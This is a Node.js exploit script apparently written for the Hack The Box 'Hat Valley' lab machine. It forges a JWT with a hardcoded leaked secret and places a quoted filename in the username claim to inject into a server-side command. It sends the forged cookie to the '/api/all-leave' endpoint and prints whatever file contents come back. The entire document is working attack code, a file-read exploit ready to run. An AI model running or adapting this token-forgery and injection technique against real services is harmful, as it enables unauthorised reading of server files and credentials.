#!/usr/bin/env node

const http = require('http')
const jwt = require('jsonwebtoken')

const TOKEN_SECRET = '123beany123'
const OPTIONS = { hostname: '10.10.11.185', path: '/api/all-leave' }

const readFile = filename => {
	const token = jwt.sign({ username: `/' ${filename} '` }, TOKEN_SECRET)

	const headers = { Cookie: `token=${token}`, Host: 'hat-valley.htb' }

	const req = http.request({ ...OPTIONS, headers }, res => {
		let body = ''

  	res.on('data', data => (body += data))
  	res.on('end', () => console.log(body))
	})

	req.on('error', console.error)
	req.end()
}

if (process.argv.length !== 3) {
	console.error('Usage: node readFile.js <filename>')
	process.exit(1)
}

readFile(process.argv[2])
